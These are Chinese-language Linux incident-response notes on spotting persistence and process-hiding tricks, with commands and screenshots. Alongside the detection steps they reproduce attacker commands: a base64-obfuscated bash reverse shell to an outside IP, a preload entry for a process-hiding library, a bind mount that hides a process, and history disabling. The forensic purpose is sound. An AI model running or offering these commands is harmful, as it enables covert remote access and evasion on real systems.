<a name="uzW3O"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639479854152-07bee894-34dd-4f99-854e-d17d0532d1bf.png#clientId=uda355058-5074-4&from=paste&height=295&id=u331b65c7&originHeight=589&originWidth=1398&originalType=binary&ratio=1&size=195614&status=done&style=none&taskId=u3b012942-f26f-48ac-ac04-9ad6c68c22e&width=699)

进入linux系统排查的时候，先把history导出来，然后进行无痕操作避免记录了操作干扰环境<br />export HISTFILE=/dev/null export HISTSIZE=0

<a name="NEPXa"></a>
## 日志
日志的路径<br />[http://c.biancheng.net/view/1097.html](http://c.biancheng.net/view/1097.html)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639486610541-142d9ea8-0b2c-4a72-8077-10f4e148a205.png#clientId=ufd18ab5a-39e6-4&from=paste&height=297&id=ue8d94042&originHeight=655&originWidth=1201&originalType=binary&ratio=1&size=119048&status=done&style=none&taskId=uf186cc4f-52d4-4929-bcec-4d556ef6b93&width=545.4000244140625)
<a name="Eqqot"></a>
## 启动项
sh脚本以服务方式启动<br />直接查看/etc/init.d/目录下的sh脚本启动项，cat一下看看有没有异常的内容<br />ls /etc/init.d/ | grep ".sh"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639480549999-3f091199-4eab-438b-acc3-f8871d152f33.png#clientId=uda355058-5074-4&from=paste&height=197&id=u79438e35&originHeight=272&originWidth=706&originalType=binary&ratio=1&size=66517&status=done&style=none&taskId=uab57a5e0-e231-4881-98aa-db10f6341e9&width=511)

<a name="RpNjG"></a>
## alias别名
alias<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639464519893-a019ba96-cbed-4a74-be23-e7d8e3f52ad3.png#clientId=ub8921103-b99a-4&from=paste&height=284&id=ua4737ac7&originHeight=214&originWidth=220&originalType=binary&ratio=1&size=26553&status=done&style=none&taskId=u17dd64a1-8260-451e-b80e-c6824455f80&width=292)

alias ls="whoami;ifconfig"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639464540909-e85003cc-2164-4894-8479-87a9939f507e.png#clientId=ub8921103-b99a-4&from=paste&height=278&id=ufbabdaff&originHeight=434&originWidth=595&originalType=binary&ratio=1&size=116155&status=done&style=none&taskId=u79e83f49-1319-4b4f-8b08-53aa3c311c9&width=381.5)

删除创建的别名<br />用法：unalias 命令别名

<a name="ERGuz"></a>
## 环境变量定义的目录下的文件替换
echo $path 获取服务器的环境变量<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481069335-1025982f-b9eb-4450-beb6-e432be9dbe88.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=47&id=u6d9d9205&originHeight=64&originWidth=723&originalType=binary&ratio=1&size=12213&status=done&style=none&taskId=udd22c9a0-0735-45b2-8313-e216bf1074d&width=531.5)

常见的环境变量都会在/usr/bin     /usr/share/man路径下，碰到其他的路径下的常见 ls、ipconfig、netstat等命令可以去执行一下看看是不是被替换的环境，也可以进行hash的比对<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481124407-51eee3f2-9b1c-4635-b8a0-6bfff25d0afe.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=78&id=u07e4d6dc&originHeight=75&originWidth=390&originalType=binary&ratio=1&size=10695&status=done&style=none&taskId=ue6f90f56-a46d-47a6-abd8-4bff5a2720e&width=403)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481147039-4cdad7b4-b9b1-4303-b8a1-361043a7976d.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=78&id=u379aecfd&originHeight=79&originWidth=417&originalType=binary&ratio=1&size=6051&status=done&style=none&taskId=ua3e4bdf7-dc86-48a4-b203-1801241ea1c&width=411.5)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481446992-b01bd04b-9264-472b-af9d-16d978b86649.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=52&id=u7f4e0eea&originHeight=58&originWidth=461&originalType=binary&ratio=1&size=11423&status=done&style=none&taskId=u110134c1-fd84-4f86-abfd-b7d94714fbb&width=413.5)

常见的可疑路径/usr/local/bin/<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481960564-55eef26a-c890-4606-91ce-6c9a7c648132.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=156&id=u158fe84b&originHeight=157&originWidth=408&originalType=binary&ratio=1&size=55412&status=done&style=none&taskId=u05632a07-8d57-45a1-b705-b5c5bc15849&width=406)
<a name="D1pFl"></a>
## 软连接
软链接创建<br />ln -s /etc/passwd /tmp/1

删除软连接<br />rm -rf  创建链接名<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639473371073-d2d2d753-6ade-4006-817e-ec5a6633add6.png#clientId=u401f801b-3800-4&from=paste&height=214&id=u146dcbaa&originHeight=234&originWidth=428&originalType=binary&ratio=1&size=38263&status=done&style=none&taskId=u8cc93fe8-8f60-454b-9d24-ecb6ae04cda&width=392)<br />判断软连接(只有在对应的生成目录才能看到相关的软连接)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639481932358-f30b3428-87e1-4c34-bbb8-8f8579babb93.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=257&id=u0e0cdaf9&originHeight=363&originWidth=590&originalType=binary&ratio=1&size=107287&status=done&style=none&taskId=u05c895e0-3e90-46c0-a752-1e27a91e52f&width=418)

ls -lR | grep ^l<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639482533257-b2f9dfa8-2cd7-40bf-bbb9-f76d395711c4.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=106&id=u5f55f535&originHeight=176&originWidth=759&originalType=binary&ratio=1&size=41037&status=done&style=none&taskId=ubaf0fc38-8cae-42c2-a885-f9f13a0286f&width=456.5)

<a name="KWUZ6"></a>
## ssh软链接后门
find / -type l -ls |grep sshd (全局搜索软连接，并筛查出sshd相关的内容<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639482524238-6acf7b94-1f79-4f66-a400-c6c77aca27bd.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=123&id=uafdded99&originHeight=176&originWidth=759&originalType=binary&ratio=1&size=41037&status=done&style=none&taskId=u5a8b6b12-f166-465a-ae40-842a40b4b03&width=528.5)<br />ssh软链接后门相关链接 [http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/](http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/)

排查：<br />1. 查看/etc/pam.d目录中有哪些文件包含auth sufficient pam_rootok.so配置；<br />find /etc/pam.d | xargs grep "pam_rootok.so"<br />2. 找到这些文件的异常端口和进程，杀死可疑进程；<br />netstat –anplt | grep –E "su | chfn | chsh | runuser"<br />ps –aux | grep PID号<br />kill -9 PID号<br />3. 找到创建的软链接文件进行删除；<br />ls -il<br />rm -rf 文件名<br />查看调用的

<a name="NXTg0"></a>
## strace查看跟踪调用的文件
strace -o /tmp/1.txt ps<br />cat 1.txt|grep ".so"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639484251754-4c671970-ee5c-42a5-97c4-7cb90442619e.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=251&id=u86e4fe23&originHeight=333&originWidth=697&originalType=binary&ratio=1&size=138263&status=done&style=none&taskId=ud036961f-6f83-44e6-bb63-949f5aaa659&width=525.5)

查看文件执行中做的操作<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639484301706-94fd918e-3fff-4f8a-9654-6eefec7b125d.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=478&id=u5adbea2a&originHeight=512&originWidth=574&originalType=binary&ratio=1&size=157856&status=done&style=none&taskId=ucd72e51b-ed0b-493b-9d4b-ab0d3b688a5&width=536)

strace –f –e trace=file –p [PID]  跟踪进程的文件操作行为。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639485473961-22163bde-6623-40bf-aea3-3cf7d003624a.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=283&id=ub8b7e972&originHeight=486&originWidth=963&originalType=binary&ratio=1&size=381609&status=done&style=none&taskId=uff3ff8b2-a2eb-456f-8da3-98e7fe2f7a8&width=560.5)

<a name="d0yLF"></a>
## strings查看文件内容
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639478610801-9a88ca5f-908b-43a1-8043-2439af254c63.png#clientId=uda355058-5074-4&from=paste&height=376&id=u80dea816&originHeight=404&originWidth=565&originalType=binary&ratio=1&size=43874&status=done&style=none&taskId=udee4fb01-d681-4e7c-982e-62b8b66f168&width=526.5)
<a name="asw4D"></a>
## stat查看文件落地时间
一般找ctime、atime，ctime一般文件创建后时间就不会变，除非系统时间变了<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639487046424-0b98f7a0-614d-473f-be42-a31bfbb47222.png#clientId=ufd18ab5a-39e6-4&from=paste&height=151&id=u8360188b&originHeight=188&originWidth=576&originalType=binary&ratio=1&size=36808&status=done&style=none&taskId=uc4ea4edf-5b76-4287-a410-8723fd0fd09&width=464)
<a name="Eo9f5"></a>
## RPM校验可疑的包
rpm -Vf <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639484822612-12e938ba-0d0a-4090-bbbc-6b2f0265bcdc.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=190&id=uc4676483&originHeight=354&originWidth=949&originalType=binary&ratio=1&size=322735&status=done&style=none&taskId=u3dcc6810-a433-402f-98ed-84d2faa0693&width=509.5)

<a name="kwPan"></a>
## ldd查看文件运行的依赖
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639485645982-0c789178-1069-4886-a02f-b1cd379595ff.png#clientId=u41fe0fc0-9ac9-4&from=paste&height=124&id=uff95b824&originHeight=164&originWidth=653&originalType=binary&ratio=1&size=39136&status=done&style=none&taskId=u176cb96b-5a6a-4705-931b-6d6e85ed205&width=492.5)

<a name="mhXow"></a>
## 查找时间范围内安装的文件
find / -type f -newerct '2021-12-14 00:00:00' -not -newerct '2021-12-14 23:59:59' <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639530554155-d78a9907-5e90-4bfb-bde0-0d8411c77792.png#clientId=ufd18ab5a-39e6-4&from=paste&height=288&id=u8afba549&originHeight=414&originWidth=717&originalType=binary&ratio=1&size=82013&status=done&style=none&taskId=u9d1cd956-28a5-4516-aac2-e9968def60f&width=498.5)

<a name="LvyxM"></a>
## 管道符隐藏进程排查
有时候攻击者通过利用管道符来隐藏进程中的ip信息<br />echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNC4yMzYuOTUvODg4OCAwPiYxCg=="|base64 --decode|bash -i<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543045398-a4723e6d-ac37-4ede-85cd-a72b998cd611.png#clientId=u0cceb63d-6021-4&from=paste&height=93&id=u44825e22&originHeight=137&originWidth=791&originalType=binary&ratio=1&size=33338&status=done&style=none&taskId=u911928d3-cb7e-47d8-8140-6a77ad135de&width=535.5)

这个时候bash是没有ip端口内容的<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543070033-3690c447-6ecb-4889-b806-0fde6b3dccf8.png#clientId=u0cceb63d-6021-4&from=paste&height=172&id=u5b663e54&originHeight=239&originWidth=771&originalType=binary&ratio=1&size=94389&status=done&style=none&taskId=ub82c8fce-ca42-4f0b-bb21-10bee2fb3fe&width=554.5)

排查：

排查需要lsof -p去指定进程id，看到外联行为<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543141520-ea5a0e6d-5086-4c14-a9f2-79121f0ce51c.png#clientId=u0cceb63d-6021-4&from=paste&height=201&id=u6c999333&originHeight=350&originWidth=937&originalType=binary&ratio=1&size=138059&status=done&style=none&taskId=uc26e3d1e-6cde-405d-9cd8-67e9cf18493&width=537.5)

使用strace -p指定进程ip，可以获取攻击者输入的命令内容<br />内容全局搜索write(2, 就能获取到攻击者执行的命令<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543319497-3bfeb453-b69e-4f84-b338-94f285b824f2.png#clientId=u0cceb63d-6021-4&from=paste&height=190&id=u68a724f9&originHeight=264&originWidth=615&originalType=binary&ratio=1&size=33446&status=done&style=none&taskId=u5fb636c8-37d2-439e-8099-d6cc33800c1&width=442.5)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543333033-c8614715-39b7-4297-9e3f-bd0c6a324703.png#clientId=u0cceb63d-6021-4&from=paste&height=128&id=u47ada66b&originHeight=123&originWidth=424&originalType=binary&ratio=1&size=11094&status=done&style=none&taskId=ub9417813-cec9-468a-ab29-a28b3794a2a&width=441)

还可以用ll /proc/pid/fd 通过判断 0、1、2以及 tty等字眼去判断<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543567618-2216dbf8-f3d5-4e03-84d6-3e70904f637e.png#clientId=u3d87270a-07ec-4&from=paste&height=68&id=u9640c06a&originHeight=136&originWidth=1051&originalType=binary&ratio=1&size=62514&status=done&style=none&taskId=u65082c23-f08a-47a1-a9f0-85b33fc2f24&width=525.5)

<a name="Xo3yw"></a>
## 预加载劫持
异常的现象就是执行一些基础命令，会异常显示<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639545985803-9425d8c1-e1d7-43fd-8250-beb0b3e3e1e7.png#clientId=u5df6660b-aec9-4&from=paste&height=67&id=ub90c2213&originHeight=87&originWidth=644&originalType=binary&ratio=1&size=33944&status=done&style=none&taskId=uc25d821f-5f5f-466b-a62f-7d626cbb35d&width=495)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639546195622-9ef3f05d-2e8d-4950-b42f-debe95373878.png#clientId=u5df6660b-aec9-4&from=paste&height=129&id=ua760c63c&originHeight=257&originWidth=1151&originalType=binary&ratio=1&size=45701&status=done&style=none&taskId=u20493ebd-d187-41f3-9e23-5a9b40967bc&width=575.5)<br />操作是编译一个so文件 替换掉/etc/下<br /> echo /usr/mytool/mytest/libprocesshider.so >> /etc/ld.so.preload  

使用strace追踪查看被替换的.so ，把access删除掉就可以恢复正常了<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639545892232-1f7bbdc2-1f79-463f-a11c-6c698def997f.png#clientId=u5df6660b-aec9-4&from=paste&height=323&id=ud98d521e&originHeight=480&originWidth=797&originalType=binary&ratio=1&size=229184&status=done&style=none&taskId=u5fc223ee-b621-400d-a550-8a6b90b50d0&width=535.5)

<a name="QYXwn"></a>
## 挂载隐藏进程

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639622797979-59bf77c0-d70b-485a-8165-813d7593969a.png#clientId=u35fae950-8a85-4&from=paste&height=50&id=ubdf4cba8&originHeight=71&originWidth=770&originalType=binary&ratio=1&size=25187&status=done&style=none&taskId=uf4397c46-4d62-45fa-9251-13995a79f10&width=541)<br />创建一个空目录进行挂载 /tmp/test<br />通过挂载，隐藏了执行1.py的进程<br />mount -o bind /tmp/test /proc/177956<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639622964623-e88345b2-2f16-47a6-b457-e83885dab3e1.png#clientId=u35fae950-8a85-4&from=paste&height=120&id=uc985e5a1&originHeight=185&originWidth=811&originalType=binary&ratio=1&size=43237&status=done&style=none&taskId=u8343d297-7cfa-4e66-bb2f-673c6862749&width=526.5)<br />umonut -v /proc/177956 恢复之前的路径<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639623093171-c8a1f99b-247c-49fd-a86a-bdf85571d733.png#clientId=u35fae950-8a85-4&from=paste&height=166&id=ue5c49af6&originHeight=270&originWidth=859&originalType=binary&ratio=1&size=68263&status=done&style=none&taskId=u8e223db9-616f-4ef7-9978-ed385b9889a&width=527.5)

排查：<br />直接mount关注一下/proc/pid进程，然后umonut取消挂载，就可以很顺利的找到攻击者的样本<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639623142896-21fbd397-c5bf-4930-aed4-63d7ad0e0984.png#clientId=u35fae950-8a85-4&from=paste&height=391&id=u0dc19b80&originHeight=578&originWidth=784&originalType=binary&ratio=1&size=241212&status=done&style=none&taskId=u105af381-5192-49b8-9c55-74315cc3209&width=531)

<a name="z7hX0"></a>
## suid提权
find / -perm -u=s -type f 2>/dev/null 找到存在suid权限的文件<br />[https://www.anquanke.com/post/id/86979](https://www.anquanke.com/post/id/86979)<br />例如：<br />用低权限用户，找到suid的文件，然后执行，发现是root组<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639617340298-7ccb67bf-fdde-4ccd-b2d6-d6ce481ae91b.png#clientId=u780eeea1-3161-4&from=paste&height=299&id=u8d9559e2&originHeight=454&originWidth=802&originalType=binary&ratio=1&size=57126&status=done&style=none&taskId=u44dfb99c-dd3e-4cbe-af19-a7247447df5&width=529)

